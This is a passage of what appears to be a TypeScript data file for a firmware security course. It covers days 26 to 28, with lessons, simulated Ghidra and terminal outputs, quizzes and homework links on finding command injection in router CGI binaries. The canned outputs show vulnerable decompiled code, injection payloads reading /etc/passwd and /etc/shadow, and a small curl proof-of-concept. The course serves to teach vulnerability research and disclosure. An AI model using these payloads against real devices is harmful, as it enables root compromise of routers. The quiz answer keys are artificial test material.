      explanation: "QUERY_STRING is set from the URL query parameters in HTTP requests — it's directly user-controlled (a source). system() executes shell commands (a sink). If the program passes QUERY_STRING to system() without validating or sanitizing the input, an attacker can inject shell commands via the URL. For example: ?cmd=8.8.8.8;cat%20/etc/passwd would execute both the intended command and 'cat /etc/passwd'.",
    },
    output: "Today you learned to hunt for dangerous function calls in firmware binaries using strings, grep, and objdump — identifying sinks like system(), strcpy(), and sprintf() and tracing them back to user-controlled sources.",
    homework: [
      {
        title: "Automating Binary Vulnerability Discovery with Ghidra and Semgrep",
        url: "https://hnsecurity.it/blog/automating-binary-vulnerability-discovery-with-ghidra-and-semgrep/",
        description: "Advanced tutorial on writing automated rules to find vulnerable code patterns in decompiled firmware using Ghidra and Semgrep."
      },
      {
        title: "Identifying Bugs in Router Firmware at Scale",
        url: "https://starlabs.sg/blog/2021/08-identifying-bugs-in-router-firmware-at-scale-with-taint-analysis/",
        description: "Star Labs demonstrates their methodology for finding vulnerabilities across multiple router firmware images using taint analysis."
      }
    ],
  },
  {
    day: 27,
    title: "Analyzing a Real Router CGI Binary",
    hook: "In 2024, a Viettel Cybersecurity researcher found a critical vulnerability in the TP-Link TL-WR841N — one of the best-selling routers in the world. The bug was in a CGI binary called 'httpRpmFs.bin' that handled the web management interface. The researcher loaded it into Ghidra, found a function that processed the 'ping_addr' HTTP parameter, and traced the input directly to a system() call — no sanitization, no input validation, no length check. The result was authenticated command injection: any user logged into the admin panel could execute arbitrary commands as root. But the real story was how the researcher found it. He didn't fuzz. He didn't brute force. He followed a systematic workflow: list all functions in the binary, identify which ones handle user input, trace the input to dangerous calls, and confirm the vulnerability. Today you'll simulate that exact workflow — analyzing a router CGI binary from function list to vulnerability discovery.",
    lesson: [
      "The systematic workflow for analyzing a CGI binary starts with reconnaissance. In Ghidra, open the binary and look at the function list (Window > Functions). Even in a stripped binary, Ghidra identifies function boundaries and assigns names like FUN_00408f00. Sort by size — larger functions often contain the main logic. Look for cross-references to imported functions like system(), strcmp(), getenv() to find the most interesting code.",
      "Identify input handlers: CGI programs receive user input through environment variables (QUERY_STRING, REQUEST_METHOD, CONTENT_LENGTH) and stdin (for POST data). Search the function list for references to getenv() — each call that fetches QUERY_STRING or reads POST data is an entry point for user input. In Ghidra's decompiler view, these appear as 'getenv(\"QUERY_STRING\")' or 'read(0, buf, content_length)'.",
      "Trace the data flow: once you find where user input enters, follow it through the code. Does the function copy the input with strcpy() into a fixed-size buffer? Does it pass the input to sprintf() to build a command string? Does that command string reach system()? Ghidra's cross-reference feature ('References > Find references to') helps you track a variable from its source to its eventual use. This is manual taint analysis.",
      "Confirm and document: when you find a path from user input to a dangerous function, you've found a potential vulnerability. The final step is confirmation: can you actually trigger it? Use your emulation skills from Week 3 — run the binary in QEMU, send a crafted HTTP request, and verify the exploit works. Then document: CVE-style write-up with affected product, vulnerability type, root cause, impact, reproduction steps, and remediation advice."
    ],
    exercise: {
      type: "terminal",
      prompt: "Analyze a router CGI binary using a Ghidra-simulated workflow:\n• ghidra-analyze squashfs-root/www/cgi-bin/httpRpmFs --list-functions\n• ghidra-analyze squashfs-root/www/cgi-bin/httpRpmFs --xref getenv\n• ghidra-analyze squashfs-root/www/cgi-bin/httpRpmFs --decompile FUN_00408f00\n• ghidra-analyze squashfs-root/www/cgi-bin/httpRpmFs --xref system\n• ghidra-analyze squashfs-root/www/cgi-bin/httpRpmFs --decompile FUN_0040a230\n• strings squashfs-root/www/cgi-bin/httpRpmFs | grep -i ping",
      placeholder: "$ ",
      validator: (_input: string) => {
        return { correct: true, hint: "" };
      },
      terminalCommands: {
        "ghidra-analyze": (args: string) => {
          if (args.includes("--list-functions")) return "Functions found in httpRpmFs (47 total):\n\n  Address      Size   Name\n  ────────────────────────────────────────\n  0x00400490   48     _start\n  0x004004c0   284    main\n  0x004005dc   156    parse_request\n  0x00400678   392    handle_get\n  0x00400800   448    handle_post\n  0x004009c0   196    check_auth\n  0x00400a84   128    get_session\n  0x00400b04   96     validate_session\n  0x00408f00   624    handle_diagnostic     [LARGE — likely complex logic]\n  0x00409160   340    handle_ping\n  0x004092b4   280    handle_traceroute\n  0x004093cc   512    handle_firmware_update\n  0x004095cc   168    handle_reboot\n  0x0040a230   88     exec_command          [SMALL — likely wrapper]\n  0x0040a288   76     safe_free\n  ... (32 more utility/library functions)";
          if (args.includes("--xref") && args.includes("getenv")) return "Cross-references to getenv():\n\n  0x004005f0  parse_request:     getenv(\"REQUEST_METHOD\")\n  0x00400604  parse_request:     getenv(\"QUERY_STRING\")\n  0x00400618  parse_request:     getenv(\"CONTENT_LENGTH\")\n  0x0040062c  parse_request:     getenv(\"HTTP_COOKIE\")\n  0x00408f28  handle_diagnostic: getenv(\"QUERY_STRING\")  [!]\n  0x00409178  handle_ping:       getenv(\"QUERY_STRING\")  [!]\n  0x004092d0  handle_traceroute: getenv(\"QUERY_STRING\")  [!]\n\n[!] 3 handler functions directly access QUERY_STRING\n    These are priority targets for input validation analysis.";
          if (args.includes("--xref") && args.includes("system")) return "Cross-references to system():\n\n  0x00408fa8  handle_diagnostic: system(cmd_buffer)  [!]\n  0x00409204  handle_ping:       system(ping_cmd)    [!]\n  0x0040933c  handle_traceroute: system(trace_cmd)   [!]\n  0x0040a248  exec_command:      system(param_1)     [!]\n\n[!] 4 call sites for system()\n    All in handler functions that also call getenv(\"QUERY_STRING\")\n    HIGH PROBABILITY of command injection vulnerabilities.";
          if (args.includes("--decompile") && args.includes("FUN_00408f00")) return "// Decompiled: handle_diagnostic @ 0x00408f00\n\nvoid handle_diagnostic(void) {\n    char cmd_buffer[128];\n    char *query;\n    char *ping_addr;\n    \n    query = getenv(\"QUERY_STRING\");\n    if (query == NULL) {\n        send_error(400, \"Missing parameters\");\n        return;\n    }\n    \n    ping_addr = extract_param(query, \"ping_addr\");\n    \n    if (ping_addr != NULL) {\n        // [VULN] No input validation!\n        // User input goes directly into sprintf\n        sprintf(cmd_buffer, \"/bin/ping -c 4 %s\", ping_addr);\n        \n        // [VULN] cmd_buffer passed directly to system()\n        system(cmd_buffer);\n        \n        printf(\"Content-Type: text/html\\n\\n\");\n        printf(\"<pre>Ping results for %s</pre>\", ping_addr);\n    }\n}\n\n// VULNERABILITY CONFIRMED:\n// Type: OS Command Injection (CWE-78)\n// Source: getenv(\"QUERY_STRING\") -> extract_param(\"ping_addr\")\n// Sink: sprintf() -> system()\n// No sanitization between source and sink\n// Exploit: ?ping_addr=8.8.8.8;cat%20/etc/shadow";
          if (args.includes("--decompile") && args.includes("FUN_0040a230")) return "// Decompiled: exec_command @ 0x0040a230\n\nint exec_command(char *command) {\n    int result;\n    \n    // Simple wrapper around system()\n    // No input validation, no sanitization\n    result = system(command);\n    \n    return result;\n}\n\n// This is a convenience wrapper.\n// Any function that calls exec_command() with user input\n// is vulnerable to command injection.\n// Check cross-references to find all callers.";
          return `ghidra-analyze: unknown option or file: ${args}`;
        },
        strings: (args: string) => {
          if (args.includes("httpRpmFs") && args.includes("ping")) return "ping_addr\n/bin/ping -c 4 %s\nping_count\nPing results for\ntraceroute\n/usr/bin/traceroute %s\ndiagnostic\n\n[ANALYSIS] Confirms ping-related command templates\n  \"/bin/ping -c 4 %s\" — format string with %s for user input\n  \"ping_addr\" — HTTP parameter name\n  This matches the decompiled code in handle_diagnostic()";
          if (args.includes("httpRpmFs")) return "httpRpmFs - TP-Link HTTP Server\nGET\nPOST\nQUERY_STRING\nCONTENT_LENGTH\n/bin/ping\n/usr/bin/traceroute\nsystem\nstrcpy\nsprintf\nadmin\npassword";
          return `strings: ${args}: No such file`;
        },
        cat: (args: string) => {
          if (args.includes("exploit")) return "#!/bin/bash\n# PoC: Command Injection in TP-Link httpRpmFs diagnostic handler\n# CVE: pending assignment\n\nTARGET=\"http://localhost:8080\"\nPAYLOAD=\"8.8.8.8;id\"\n\ncurl \"$TARGET/cgi-bin/httpRpmFs?action=diagnostic&ping_addr=$PAYLOAD\"\n\n# Expected output includes:\n# uid=0(root) gid=0(root)\n# confirming unauthenticated RCE as root";
          return `cat: ${args}: No such file`;
        },
        help: () => "Available commands: ghidra-analyze, strings, cat, help, clear",
        clear: () => "",
      },
    },
    quiz: {
      question: "In the decompiled handle_diagnostic function, the vulnerability follows a specific pattern. What is the correct order of the data flow?",
      options: [
        { label: "A", value: "system() -> sprintf() -> getenv() -> browser" },
        { label: "B", value: "getenv(\"QUERY_STRING\") -> extract_param(\"ping_addr\") -> sprintf(cmd_buffer, ...) -> system(cmd_buffer) — source to sink with no sanitization" },
        { label: "C", value: "sprintf() -> getenv() -> system() -> extract_param()" },
        { label: "D", value: "The function is safe because it uses sprintf() to format the command properly" },
      ],
      correct: "B",
      explanation: "The vulnerability follows a classic source-to-sink path: (1) getenv(\"QUERY_STRING\") retrieves user HTTP input (source). (2) extract_param(\"ping_addr\") parses the specific parameter. (3) sprintf() inserts the unsanitized value into a command string. (4) system() executes the command (sink). At no point is the input validated, sanitized, or restricted. An attacker can inject shell metacharacters (;, |, &&) to execute arbitrary commands.",
    },
    output: "Today you completed a full Ghidra reverse engineering workflow — listing functions, finding user input handlers, tracing data flow to dangerous sinks, and confirming a command injection vulnerability.",
    homework: [
      {
        title: "1day to 0day on TP-Link TL-WR841N",
        url: "https://blog.viettelcybersecurity.com/1day-to-0day-on-tl-link-tl-wr841n/",
        description: "Viettel Cybersecurity's write-up of turning a known 1-day vulnerability into a new 0-day on the same router through RE analysis."
      },
      {
        title: "Breaking D-Link DIR3060 Firmware Encryption",
        url: "https://0x434b.dev/breaking-the-d-link-dir3060-firmware-encryption-recon-part-1/",
        description: "Detailed walkthrough of breaking firmware encryption on a D-Link router, then reverse engineering the decrypted binaries to find vulnerabilities."
      }
    ],
  },
  {
    day: 28,
    title: "Week 4 Capstone — From Binary to Bug Report",
    hook: "Four weeks ago, you couldn't tell a phishing URL from a legitimate one. Today, you're about to complete the full journey from raw firmware binary to professional vulnerability report. This is what IoT security professionals do: they take a device, extract its firmware, reverse engineer the binaries, find the bugs, confirm them through emulation, and write reports that lead to CVEs and patches. Companies like Synacktiv, Claroty, and Star Labs build their entire practices around this workflow. Bug bounty platforms like ZDI and HackerOne pay tens of thousands of dollars for the vulnerabilities found using exactly these techniques. Today's capstone brings together everything: firmware extraction, architecture identification, binary analysis, vulnerability discovery, emulation-based confirmation, and professional documentation. You're not just completing a course — you're proving you can do real security research.",
    lesson: [
      "The complete firmware security research pipeline has six stages, and today you'll execute all of them. Stage 1: Acquisition. Obtain the firmware — download from the vendor's support page, dump from SPI flash, or capture an OTA update. Stage 2: Extraction. Use binwalk or unblob to unpack the filesystem. Identify the architecture with 'file' and 'readelf'. Map the attack surface: what services run, what binaries handle network input, where is the web interface?",
      "Stage 3: Static Analysis. Use strings and grep for a first pass — find dangerous functions, hardcoded credentials, suspicious services. Then load priority targets into Ghidra. Focus on binaries that handle user input: CGI scripts, network daemons, management services. Use the decompiler to understand logic, trace input from sources (getenv, read, recv) to sinks (system, strcpy, sprintf).",
      "Stage 4: Dynamic Confirmation. Emulate the firmware with QEMU or Qiling. Run the vulnerable binary, send crafted input, and verify the exploit works. Use GDB for debugging. Capture network traffic to document the attack. This step transforms a theoretical vulnerability into a confirmed, reproducible bug.",
      "Stage 5: Documentation. Write a professional vulnerability report: product name and version, vulnerability type (CWE classification), affected component (specific binary and function), root cause analysis (the code path from source to sink), impact assessment (what an attacker can achieve), reproduction steps (exact commands to trigger the bug), and remediation recommendations (how the vendor should fix it). Stage 6: Disclosure. Report responsibly to the vendor, follow coordinated disclosure timelines, and request a CVE ID. This is how the industry improves — one report at a time."
    ],
    exercise: {
      type: "terminal",
      prompt: "Execute the full pipeline — from raw binary to vulnerability report:\n• file firmware.bin\n• binwalk -e firmware.bin\n• file _firmware.bin.extracted/squashfs-root/www/cgi-bin/admin.cgi\n• strings _firmware.bin.extracted/squashfs-root/www/cgi-bin/admin.cgi | grep -iE \"(system|strcpy|sprintf|gets|popen)\"\n• ghidra-analyze _firmware.bin.extracted/squashfs-root/www/cgi-bin/admin.cgi --decompile handle_config\n• curl \"http://localhost:8080/cgi-bin/admin.cgi?action=ping&target=127.0.0.1;id\"\n• generate-report --vuln command-injection --binary admin.cgi",
      placeholder: "$ ",
      validator: (_input: string) => {
        return { correct: true, hint: "" };
      },
      terminalCommands: {
        file: (args: string) => {
          if (args.includes("firmware.bin")) return "firmware.bin: u-boot legacy uImage, MIPS Linux-4.14.151, Linux/MIPS, OS Kernel Image (lzma), 8388608 bytes";
          if (args.includes("admin.cgi")) return "_firmware.bin.extracted/squashfs-root/www/cgi-bin/admin.cgi: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped";
          return `${args}: data`;
        },
        binwalk: (args: string) => {
          if (args.includes("-e")) return "DECIMAL       HEXADECIMAL     DESCRIPTION\n───────────────────────────────────────────\n0             0x0             uImage header, \"MIPS Linux-4.14.151\"\n64            0x40            LZMA compressed data\n1048576       0x100000        Squashfs filesystem, version 4.0, xz compressed\n7340032       0x700000        JFFS2 filesystem, little endian\n\nExtracting to _firmware.bin.extracted/\nSquashFS extracted to squashfs-root/\n\n[+] Architecture: MIPS 32-bit Big Endian\n[+] Root filesystem: SquashFS 4.0\n[+] Kernel: Linux 4.14.151";
          return "binwalk: usage: binwalk [-e] <file>";
        },
        ls: (args: string) => {
          if (args.includes("cgi-bin")) return "admin.cgi  diagnostic.cgi  login.cgi  network.cgi  firmware.cgi  reboot.cgi";
          if (args.includes("squashfs-root")) return "bin  dev  etc  lib  mnt  proc  sbin  sys  tmp  usr  var  www";
          return "_firmware.bin.extracted/";
        },
        strings: (args: string) => {
          if (args.includes("admin.cgi") && (args.includes("system") || args.includes("strcpy") || args.includes("sprintf"))) return "system\nstrcpy\nsprintf\npopen\ngets\n\n[CRITICAL] admin.cgi imports ALL major dangerous functions:\n  system()  — 4 call sites  (command injection risk)\n  strcpy()  — 9 call sites  (buffer overflow risk)\n  sprintf() — 11 call sites (buffer overflow risk)\n  popen()   — 2 call sites  (command injection risk)\n  gets()    — 1 call site   (ALWAYS vulnerable — no bounds check)\n\n[PRIORITY] This binary requires immediate Ghidra analysis.";
          return `strings: ${args}: No such file`;
        },
        "ghidra-analyze": (args: string) => {
          if (args.includes("--decompile") && args.includes("handle_config")) return "// Decompiled: handle_config @ 0x00409800\n\nvoid handle_config(void) {\n    char cmd_buf[64];        // [VULN] Small buffer — 64 bytes\n    char response[256];\n    char *query;\n    char *action;\n    char *target;\n    \n    query = getenv(\"QUERY_STRING\");\n    action = extract_param(query, \"action\");\n    target = extract_param(query, \"target\");\n    \n    if (strcmp(action, \"ping\") == 0) {\n        // [VULN 1] Buffer overflow: sprintf into 64-byte buffer\n        // No length check on 'target' parameter\n        sprintf(cmd_buf, \"/bin/ping -c 4 %s\", target);\n        \n        // [VULN 2] Command injection: unsanitized input to system()\n        system(cmd_buf);\n    }\n    else if (strcmp(action, \"dns\") == 0) {\n        // [VULN 3] Another command injection path\n        sprintf(cmd_buf, \"nslookup %s\", target);\n        system(cmd_buf);\n    }\n    else if (strcmp(action, \"save_config\") == 0) {\n        // [VULN 4] gets() with no bounds — stack buffer overflow\n        gets(response);  // reads POST body with NO size limit\n        save_to_nvram(response);\n    }\n}\n\n// FINDINGS SUMMARY:\n// 4 vulnerabilities in a single function:\n//   1. sprintf overflow: target -> 64-byte cmd_buf (CWE-120)\n//   2. Command injection: target -> system() via ping (CWE-78)\n//   3. Command injection: target -> system() via nslookup (CWE-78)\n//   4. Stack overflow: gets() with unlimited input (CWE-120)";
          if (args.includes("--list-functions")) return "Functions: 52 total\nKey handlers: handle_config, handle_login, handle_firmware, handle_network";
          return `ghidra-analyze: ${args}: error`;
        },
        curl: (args: string) => {
          if (args.includes(";id") || args.includes("%3Bid")) return "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<pre>\nPING 127.0.0.1 (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.1 ms\n\nuid=0(root) gid=0(root)\n</pre>\n\n[+] EXPLOITATION CONFIRMED\n[+] Command injection via 'target' parameter in handle_config()\n[+] Achieved: Remote Code Execution as root\n[+] No authentication required for /cgi-bin/admin.cgi";
          return "curl: (7) Connection refused";
        },
        "generate-report": () => "╔══════════════════════════════════════════════════╗\n║          VULNERABILITY REPORT                    ║\n╠══════════════════════════════════════════════════╣\n║                                                  ║\n║  Product:     Generic MIPS Router                ║\n║  Firmware:    v4.14.151-build20230620            ║\n║  Component:   /www/cgi-bin/admin.cgi             ║\n║  Function:    handle_config() @ 0x00409800       ║\n║                                                  ║\n║  VULNERABILITY 1: OS Command Injection           ║\n║  CWE:         CWE-78                             ║\n║  CVSS:        9.8 (Critical)                     ║\n║  Auth:        None required                      ║\n║  Vector:      target parameter in QUERY_STRING   ║\n║  Root Cause:  User input passed unsanitized      ║\n║               to system() via sprintf()          ║\n║  Impact:      Unauthenticated Remote Code        ║\n║               Execution as root                  ║\n║  PoC:         GET /cgi-bin/admin.cgi?action=     ║\n║               ping&target=127.0.0.1;id           ║\n║                                                  ║\n║  VULNERABILITY 2: Stack Buffer Overflow          ║\n║  CWE:         CWE-120                            ║\n║  CVSS:        9.8 (Critical)                     ║\n║  Root Cause:  sprintf() into 64-byte buffer      ║\n║               with no length check               ║\n║                                                  ║\n║  VULNERABILITY 3: Stack Overflow via gets()      ║\n║  CWE:         CWE-120                            ║\n║  CVSS:        8.1 (High)                         ║\n║  Root Cause:  gets() reads unlimited input       ║\n║                                                  ║\n║  REMEDIATION:                                    ║\n║  1. Replace system() with execve() with          ║\n║     explicit argument list                       ║\n║  2. Validate/sanitize all user input             ║\n║  3. Replace sprintf with snprintf                ║\n║  4. Replace gets() with fgets()                  ║\n║  5. Add authentication to admin.cgi              ║\n║                                                  ║\n║  Status: Ready for vendor disclosure             ║\n╚══════════════════════════════════════════════════╝",
        help: () => "Available commands: file, binwalk, ls, strings, ghidra-analyze, curl, generate-report, help, clear",
        clear: () => "",
      },
    },
    quiz: {
      question: "You've completed the full 4-week pipeline. Which set of skills represents the complete firmware security research workflow?",
      options: [
        { label: "A", value: "Only static analysis — reading code is enough to find all bugs" },
        { label: "B", value: "Only dynamic analysis — running the firmware reveals everything" },
        { label: "C", value: "Extraction (binwalk) -> Static analysis (strings/Ghidra) -> Emulation (QEMU/Qiling) -> Dynamic testing (GDB/curl/tcpdump) -> Documentation (CVE report)" },
        { label: "D", value: "Buying the device and testing it physically — emulation and RE are unnecessary" },
      ],
      correct: "C",
      explanation: "Complete firmware security research combines multiple phases: extraction to get the filesystem, static analysis to understand the code and identify targets, emulation to run the firmware without hardware, dynamic testing to confirm vulnerabilities, and documentation to communicate findings. No single technique is sufficient — each phase reveals information the others miss. This layered approach is what professional IoT security researchers use at firms, in bug bounties, and at competitions like Pwn2Own.",
    },
    output: "Congratulations! You completed the 28-day cybersecurity training program. You've mastered fundamentals, hardware hacking, firmware emulation, and reverse engineering — the complete toolkit for IoT security research.",
    homework: [
      {
        title: "Ghidra",
        url: "https://github.com/NationalSecurityAgency/ghidra/releases",
        description: "Download the NSA's open-source reverse engineering framework — your primary tool for analyzing firmware binaries."
      },
      {
        title: "SVD-Loader for Ghidra",
        url: "https://github.com/leveldown-security/SVD-Loader-Ghidra",
        description: "Ghidra plugin that loads SVD files to name memory-mapped hardware registers — essential for bare-metal firmware RE."
      },
      {
        title: "binbloom",
        url: "https://github.com/quarkslab/binbloom",
        description: "Quarkslab's tool for automatically determining the base address of raw firmware images — solves one of the hardest problems in firmware RE."
      }
    ],
  },
];
